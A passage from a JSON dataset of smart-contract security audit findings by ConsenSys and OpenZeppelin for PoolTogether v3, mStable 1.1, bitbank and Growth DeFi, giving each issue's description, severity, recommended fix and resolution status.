      "source_link": "https://consensys.net/diligence/audits/2020/12/growth-defi-v1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "John Mardlin",
        "Alexander Wade"
      ]
    },
    {
      "id": "13597",
      "title": "ERC20 tokens with no return value will fail to transfer ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue was addressed using OpenZeppelin’s SafeERC20.\n\n\n#### Description\n\n\nAlthough the ERC20 standard suggests that a transfer should return `true` on success, many tokens are non-compliant in this regard.\n\n\nIn that case, the `.transfer()` call here will revert even if the transfer is successful, because solidity will check that the RETURNDATASIZE matches the ERC20 interface.\n\n\n**code/contracts/ExchangeDeposit.sol:L229-L231**\n\n\n\n```\nif (!instance.transfer(getSendAddress(), forwarderBalance)) {\n    revert('Could not gather ERC20');\n}\n\n```\n#### Recommendation\n\n\nConsider using [OpenZeppelin’s SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/SafeERC20.sol).",
      "summary": "\nThis bug report is about a problem that can occur when transferring ERC20 tokens. The ERC20 standard suggests that a transfer should return `true` on success, however, some tokens are non-compliant in this regard. When this happens, the `.transfer()` call can revert even if the transfer is successful. To fix this issue, OpenZeppelin’s SafeERC20 was used. SafeERC20 is a smart contract library that provides a safe version of the ERC20 token standard. It allows for transfers to be made in a secure and reliable way. To avoid this issue in the future, it is recommended to use OpenZeppelin’s SafeERC20.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "bitbank",
      "source_link": "https://consensys.net/diligence/audits/2020/11/bitbank/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Nicholas Ward",
        "John Mardlin"
      ]
    },
    {
      "id": "11256",
      "title": "[L02] Tests not passing",
      "impact": "LOW",
      "content": "The testing suite finishes with 4 failing tests. These tests are:\n\n\n`1) Tickets Feature: should not be possible to buy or transfer tickets during award  \n\n2) SingleRandomWinner: removeExternalErc20Award()  \n\n3) SingleRandomWinner: addExternalErc721Award()  \n\n4) SingleRandomWinner: removeExternalErc721Award()`\n\n\nAs the test suite was left outside of the audit’s scope, please consider thoroughly reviewing the test suite to make sure all tests run successfully. Furthermore, it is advisable to only merge code that neither breaks the existing tests nor decreases coverage.\n\n\n***Update:** Fixed in [pull request #205](https://github.com/pooltogether/pooltogether-pool-contracts/pull/205).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11255",
      "title": "[L01] Missing docstrings",
      "impact": "LOW",
      "content": "All the functions in the [`CompoundPrizePoolBuilder`](https://github.com/pooltogether/pooltogether-pool-contracts/blob/5a9381340a7cef139c77e44c5ad5c2a5d6e12e36/contracts/builders/CompoundPrizePoolBuilder.sol) and the [`yVaultPrizePoolBuilder`](https://github.com/pooltogether/pooltogether-pool-contracts/blob/5a9381340a7cef139c77e44c5ad5c2a5d6e12e36/contracts/builders/yVaultPrizePoolBuilder.sol) contracts lack documentation. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\n***Update:** Fixed in [pull request #216](https://github.com/pooltogether/pooltogether-pool-contracts/pull/216).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11254",
      "title": "[M01] Capturing the award balance may fail",
      "impact": "MEDIUM",
      "content": "The [`captureAwardBalance` function](https://github.com/pooltogether/pooltogether-pool-contracts/blob/5a9381340a7cef139c77e44c5ad5c2a5d6e12e36/contracts/prize-pool/PrizePool.sol#L461) of the `PrizePool` contract relies on the [underlying asset balance](https://github.com/pooltogether/pooltogether-pool-contracts/blob/5a9381340a7cef139c77e44c5ad5c2a5d6e12e36/contracts/prize-pool/PrizePool.sol#L463) to calculate any available interest as award balance. Given that the way of calculating this balance may differ on each yield source, there is a possiblity that the [calculated `totalInterest`](https://github.com/pooltogether/pooltogether-pool-contracts/blob/5a9381340a7cef139c77e44c5ad5c2a5d6e12e36/contracts/prize-pool/PrizePool.sol#L464) may be greater than the `_currentAwardBalance` accumulated. For instance, the [`balanceOfUnderlying`](https://github.com/compound-finance/compound-protocol/blob/23eac9425accafb82551777c93896ee7678a85a3/contracts/CToken.sol#L190) function in the Compound’s `CToken` contract [truncates the returned result](https://github.com/compound-finance/compound-protocol/blob/23eac9425accafb82551777c93896ee7678a85a3/contracts/CToken.sol#L192), which could lead into [an underflow when calculating the unnacounted prize balance](https://github.com/pooltogether/pooltogether-pool-contracts/blob/5a9381340a7cef139c77e44c5ad5c2a5d6e12e36/contracts/prize-pool/PrizePool.sol#L465) in extreme cases, and therefore stall the function for future calls.\n\n\nEven though this might not occur in the system as it is, this may change in future versions of the protocol when introducing new yield sources.\n\n\nConsider checking that the [`totalInterest`](https://github.com/pooltogether/pooltogether-pool-contracts/blob/5a9381340a7cef139c77e44c5ad5c2a5d6e12e36/contracts/prize-pool/PrizePool.sol#L464) value calculated using the underlying asset’s balance is greater than the accumulated `_currentAwardBalance`.\n\n\n***Update:** Fixed in [pull request #205](https://github.com/pooltogether/pooltogether-pool-contracts/pull/205). The `captureAwardBalance` function now checks that the `totalInterest` value is greater than the `_currentAwardBalance` value to avoid the subtraction underflow.*",
      "summary": "\nThe `captureAwardBalance` function of the `PrizePool` contract is used to calculate any available interest as award balance. The way of calculating this balance may differ on each yield source, and there is a possibility that the calculated `totalInterest` may be greater than the `_currentAwardBalance` accumulated. This could lead to an underflow when calculating the unnacounted prize balance in extreme cases, and therefore stall the function for future calls. To avoid this, it is important to check that the `totalInterest` value is greater than the `_currentAwardBalance` value. This issue has been fixed in pull request #205, and the `captureAwardBalance` function now checks for this to prevent any subtraction underflow.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11253",
      "title": "[L06] Naming suggestions",
      "impact": "LOW",
      "content": "The [`PrizePool` contract](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol) implements the naming convention of prefixing `internal` values with an underscore. However, the following functions and variables disregard this convention:\n\n\n* [timelockBalances](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L110)\n* [unlockTimestamps](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L113)\n* [limitExitFee](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L305)\n* [isControlled](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L618)\n\n\nAdditionally, in the `MappedSinglyLinkedList` library, [`SENTINAL`](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L8) should be `SENTINEL`.\n\n\n***Update:** Fixed in [pull request #108](https://github.com/pooltogether/pooltogether-pool-contracts/pull/108) and [pull request #109](https://github.com/pooltogether/pooltogether-pool-contracts/pull/109).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11252",
      "title": "[L05] MappedSinglyLinkedList Encapsulation",
      "impact": "LOW",
      "content": "To improve encapsulation of the `MappedSinglyLinkedList` data structure, consider renaming [both](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L79) [instances](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L91) of the `currentToken` variable to `currentAddress`.\n\n\nAdditionally, consider including `start`, `end` and `next` functions so [functions that traverse the list](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L606-L613) do not need to know the `addressMap` or `SENTINAL` implementation details.\n\n\n***Update:** Fixed in [pull request #108](https://github.com/pooltogether/pooltogether-pool-contracts/pull/108).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11251",
      "title": "[L04] Lack of event emission after sensitive changes",
      "impact": "LOW",
      "content": "The [`addControlledToken` function](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L554) of the `PrizePool` contract adds a new token to the `_tokens` array without emitting an event. To facilitate off-chain services tracking important state changes, consider emitting an event with the new token address, as well as emitting the same event for the first set of tokens added in the `initialize` function.\n\n\n***Update**: Fixed in [pull request #107](https://github.com/pooltogether/pooltogether-pool-contracts/pull/107). The `addControlledToken` function now emits the `ControlledTokenAdded` event.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11250",
      "title": "[L03] Lists can be initialized multiple times",
      "impact": "LOW",
      "content": "The `MappedSinglyLinkedList` data structure can be initialized multiple times by calling any of the [initialize functions](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L21-L39), which can lead to several inconsistencies:\n\n\n* Addresses in the original list cannot be [added](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L44) to the active one\n* Addresses in the original list **can** be [removed](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L56), despite not affecting the active list, which [may lead to a negative integer overflow](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L61)\n* Addresses in the original list will appear to be [contained](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L68) in the active one\n\n\nThis does not occur in the audited code. Nevertheless, consider preventing initialization of non-empty lists.\n\n\n***Update:** Fixed in [pull request #106](https://github.com/pooltogether/pooltogether-pool-contracts/pull/106). Now, the `initialize` function explicitly checks that the number of items in the list is zero before initialization.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11249",
      "title": "[L02] Linked list contains SENTINAL",
      "impact": "LOW",
      "content": "The [`contains` function](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L68) of the `MappedSinglyLinkedList` library will incorrectly return `true` when called with the [`SENTINAL` address](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L8). Consider checking and returning `false` in this edge case.\n\n\n***Update:** Fixed in [pull request #105](https://github.com/pooltogether/pooltogether-pool-contracts/pull/105). The `contains` function now returns false when called with the `SENTINAL` address.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11248",
      "title": "[L01] Duplicate code",
      "impact": "LOW",
      "content": "The `withdrawInstantlyFrom` function of the `PrizePool` contract  \n\n[caps the exit fee](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L271) with the `limitExitFee` function, and then immediately [performs the same operation to limit it again](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L274-L277). Consider removing the redundant code.\n\n\n***Update:** Fixed in [pull request #104](https://github.com/pooltogether/pooltogether-pool-contracts/pull/104).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11247",
      "title": "[M01] Inconsistent list initialization",
      "impact": "MEDIUM",
      "content": "The `MappedSinglyLinkedList` library has an [`initialize` function that accepts multiple addresses](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L29). However, it does not perform any validation of the user-supplied addresses. If the list contains duplicate addresses or the special `SENTINAL` address, it will be created in an inconsistent state. Consider using the [`addAddress` function](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/utils/MappedSinglyLinkedList.sol#L44) in the loop to perform the appropriate checks.\n\n\n***Update:** Fixed in [pull request #103](https://github.com/pooltogether/pooltogether-pool-contracts/pull/103). The `initialize` function no longer accepts an array of addresses as a parameter, and the `addAddresses` function was implemented to add multiple items to the list, handling both duplicate addresses and the `SENTINAL` address.*",
      "summary": "\nThe `MappedSinglyLinkedList` library contains an `initialize` function that can accept multiple addresses as parameters. However, this function does not check for duplicate addresses or the special `SENTINAL` address, which can lead to an inconsistent state. To solve this issue, the `addAddress` function should be used in a loop to perform the necessary checks. This issue has now been fixed in pull request #103, where the `initialize` function no longer accepts an array of addresses and the `addAddresses` function was implemented to add multiple items to the list while ensuring that duplicate addresses and the `SENTINAL` address are handled appropriately.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11246",
      "title": "[H02] Trapped sponsorship",
      "impact": "HIGH",
      "content": "The `withdrawInstantlyFrom` function of the `PrizePool` allows the caller to [optionally provide a `sponsorAmount`](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L260) that will be applied towards the exit fee. In practice, this should be equivalent to a simple transfer from the caller to the `from` address. Whether or not a `sponsorAmount` is provided, the exit fee should be implicitly levied by leaving this amount in the yield service. However, the prize pool [only leaves the non-sponsored component of the exit fee in the yield service](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L293-L294), which is the same amount that is [transferred to the user](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L296). This means the sponsored amount remains trapped in the `PrizePool` contract and is not included in the next award. Consider adjusting the `_redeem` parameters so the full exit fee is left in the yield service.\n\n\n***Update:** Fixed in [pull request #102](https://github.com/pooltogether/pooltogether-pool-contracts/pull/102). The Pooltogether team decided to remove the sponsor amount from the `withdrawInstantlyFrom` function.*",
      "summary": "\nA bug was reported in the `withdrawInstantlyFrom` function of the `PrizePool` contract. This function allows the caller to optionally provide a `sponsorAmount` that should be applied towards the exit fee. However, the prize pool only leaves the non-sponsored component of the exit fee in the yield service, and does not include the sponsored amount in the next award. This means the sponsored amount remains trapped in the `PrizePool` contract.\n\nThe Pooltogether team decided to remove the sponsored amount from the `withdrawInstantlyFrom` function, which was fixed in pull request #102.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11245",
      "title": "[H01] Improper Error Handling",
      "impact": "HIGH",
      "content": "The `CompoundPrizePool` contract interacts with the Compound system to [mint new cTokens](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/compound/CompoundPrizePool.sol#L87) and [redeem them for the underlying asset](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/compound/CompoundPrizePool.sol#L101). In both cases the code ignores the returned [error code](https://github.com/compound-finance/compound-protocol/blob/master/contracts/CErc20.sol#L42). Since these calls are intended to be part of atomic operations that [mint](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L240-L242) and [burn](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L289-L294) pool tokens, failure to account for errors in the Compound calls could lead to internal inconsistencies, under-invested tokens and loss of user funds.\n\n\nConsider reverting the transaction whenever the Compound system returns an error, to ensure the operations remain atomic.\n\n\n***Update:** Fixed in [pull request #101](https://github.com/pooltogether/pooltogether-pool-contracts/pull/101/). The `_redeem` and `_supply` functions in `CompoundPrizePool.sol` now require that the value returned by the `cToken` contract equals zero, which represents the [NO\\_ERROR code in Compound](https://github.com/compound-finance/compound-protocol/blob/1cf040412fc8a0cfd1187bb0d8a525c3ae2f78aa/contracts/ErrorReporter.sol#L5).*",
      "summary": "\nA bug was found in the `CompoundPrizePool` contract, which interacts with the Compound system to mint new cTokens and redeem them for the underlying asset. In both cases, the code ignored the returned error code, which could lead to internal inconsistencies, under-invested tokens and loss of user funds. To fix the issue, the transaction was reverted whenever the Compound system returns an error, to ensure the operations remain atomic. The bug was fixed in pull request #101, where the `_redeem` and `_supply` functions now require that the value returned by the `cToken` contract equals zero, which represents the NO_ERROR code in Compound.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11244",
      "title": "[C01] Funds can be lost",
      "impact": "HIGH",
      "content": "The [`sweepTimelockBalances` function](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L471) accepts a list of users with unlocked balances to distribute. However, if there are duplicate users in the list, their balances will be counted multiple times when calculating the [total amount to withdraw](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L493) from the yield service. This has two consequences:\n\n\n* After the transaction is complete, the excess amount withdrawn will be held by the `PrizePool` contract (instead of the yield service) and will not earn interest\n* Eventually, a user will want to withdraw that amount, which will fail when the `PrizePool` attempts to [redeem it from the yield service](https://github.com/pooltogether/pooltogether-pool-contracts/blob/23b826b94e62d9c3a49bbe637da44cd1409c5b7f/contracts/prize-pool/PrizePool.sol#L294). This means the last users to withdraw will lose their funds. Interestingly, in the case of the `CompoundPrizePool`, this is partially mitigated by the [**“[H01] Improper Error Handling”**](#h01) issue.\n\n\nConsider checking for duplicate users when calculating the amount to withdraw.\n\n\n***Update**: Fixed in [pull request #100](https://github.com/pooltogether/pooltogether-pool-contracts/pull/100). The `_sweepTimelockBalances` function now removes the user’s timelock balance after adding it to the total withdrawal amount and saving it into an auxiliary array named `balances`, which has the same size as the `users` array provided as a parameter. In this process, as the code still allows the `users` to have duplicate addresses, a zero will be saved in the `balances` array for each repeated address.*",
      "summary": "\nA bug was found in the `sweepTimelockBalances` function of the PoolTogether Pool Contracts which allowed for duplicate users to be included in the list of users with unlocked balances to distribute. This caused an excess amount to be withdrawn from the yield service, which was then held by the `PrizePool` contract instead. This meant that the last users to withdraw would lose their funds, and the issue was partially mitigated by the “H01 Improper Error Handling” issue.\n\nTo fix the bug, the `_sweepTimelockBalances` function was updated in pull request #100. Duplicate users are now removed after adding their balance to the total withdrawal amount, and a zero is saved in the `balances` array for each repeated address.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether v3 Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-v3-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13641",
      "title": "Outdated Solidity version  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nthe issue was deemed acceptable because an update to solc 0.5.17 [would not fix any relevant security bugs](https://github.com/ethereum/solidity/releases/tag/v0.5.17).\n\n\n#### Description\n\n\nThe codebase is using an outdated version of the Solidity compiler.\n\n\n#### Recommendation\n\n\nPlease consider using an up-to-date version (ideally 0.6.12 or at least 0.5.17).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13640",
      "title": "Discrepancy between code and comments ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe comments have been updated.\n\n\n#### Description\n\n\nThere is a discrepancy between the code at:\n\n\n**code/contracts/masset/BasketManager.sol:L417**\n\n\n\n```\nrequire(weightSum >= 1e18 && weightSum <= 4e18, \"Basket weight must be >= 100 && <= 400%\");\n\n```\nAnd the comment at:\n\n\n**code/contracts/masset/BasketManager.sol:L409**\n\n\n\n```\n\\* @dev Throws if the total Basket weight does not sum to 100\n\n```\n#### Recommendation\n\n\nUpdate the code or the comment to be consistent.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13639",
      "title": "Potential gas savings by terminating early  Acknowledged",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nacknowledged that gas savings are possible, might be moved changed in a future version.\n\n\n#### Description\n\n\nIf a function invocation is bound to revert, one should try to revert as soon as possible to save gas. In `ForgeValidator.validateRedemption` it is possible to terminate more early:\n\n\n**code/contracts/masset/forge-validator/ForgeValidator.sol:L264**\n\n\n\n```\nif(atLeastOneBecameOverweight) return (false, \"bAssets must remain below max weight\", false);\n\n```\n#### Recommendation\n\n\nConsider moving the require-statement a few lines up (for instance, after assigning to `atLeastOneBecameOverweight`).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13638",
      "title": "BassetStatus enum defines multiple unused states  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe states will potentially be used in future releases.\n\n\n#### Description\n\n\nThe `BassetStatus` enum defines several values that do not seem to be assigned in the code:\n\n\n* Default (different from “Normal”?)\n* Blacklisted\n* Liquidating\n* Liquidated\n* Failed\n\n\n**code/contracts/masset/shared/MassetStructs.sol:L59-L69**\n\n\n\n```\n/\\*\\* @dev Status of the Basset - has it broken its peg? \\*/\nenum BassetStatus {\n    Default,\n    Normal,\n    BrokenBelowPeg,\n    BrokenAbovePeg,\n    Blacklisted,\n    Liquidating,\n    Liquidated,\n    Failed\n}\n\n```\nSince some of these are used in the code there might be some dead code that can be removed as a result. For example:\n\n\n**code/contracts/masset/forge-validator/ForgeValidator.sol:L46-L47**\n\n\n\n```\n\\_bAsset.status == BassetStatus.Liquidating ||\n\\_bAsset.status == BassetStatus.Blacklisted\n\n```\n\n#### Recommendation\n\n\nIf those values are indeed never used please consider removing them to simplify the code.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13637",
      "title": "Unused field in ForgePropsMulti struct  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe field is currently used but will be used in a future version.\n\n\n#### Description\n\n\nThe `ForgePropsMulti` struct defines the field `isValid` which always seems to be true:\n\n\n**code/contracts/masset/shared/MassetStructs.sol:L78-L84**\n\n\n\n```\n/\\*\\* @dev All details needed to Forge with multiple bAssets \\*/\nstruct ForgePropsMulti {\n    bool isValid; // Flag to signify that forge bAssets have passed validity check\n    Basset[] bAssets;\n    address[] integrators;\n    uint8[] indexes;\n}\n\n```\nIf it is indeed always true, one could remove the following line:\n\n\n**code/contracts/masset/Masset.sol:L518**\n\n\n\n```\nif(!props.isValid) return 0;\n\n```\n#### Recommendation\n\n\nIf the field is indeed always true please consider removing it to simplify the code.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13636",
      "title": "Assumptions are made about bAssets  Acknowledged",
      "impact": "LOW",
      "content": "#### Description\n\n\nThe code makes several assumptions about the bAssets that can be used. A malicious or malfunctioning asset contract might violate those assumptions. This might lead to unintended behavior in the system. Below there are several such assumptions:\n\n\n1. Decimals of a bAsset are constant where the decimals are used to derive the asset’s ratio:\n\n\n**code/contracts/masset/BasketManager.sol:L319**\n\n\n\n```\nuint256 bAsset\\_decimals = CommonHelpers.getDecimals(\\_bAsset);\n\n```\n2. Decimals must be in a range from 4 to 18:\n\n\n**code/contracts/shared/CommonHelpers.sol:L23**\n\n\n\n```\nrequire(decimals >= 4 && decimals <= 18, \"Token must have sufficient decimal places\");\n\n```\n3. The governor is able to foresee when transfer fees are charged (which needs to be called if anything changes); in theory, assets could be much more flexible in when transfer fees are charged (for instance, during certain periods or for certain users)\n\n\n**code/contracts/masset/BasketManager.sol:L425**\n\n\n\n```\nfunction setTransferFeesFlag(address \\_bAsset, bool \\_flag)\n\n```\nIt seems like some of these assumptions could be avoided, but there might be a cost. For instance, one could retrieve the decimals directly instead of “caching” them and one could always enable the setting where transfer fees may be charged.\n\n\n#### Recommendation\n\n\nConsider revisiting or avoiding these assumptions. For any assumptions that are there by design it would be good to document them to facilitate future changes.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13635",
      "title": "Assumptions are made about Aave and Compound integrations  Acknowledged",
      "impact": "LOW",
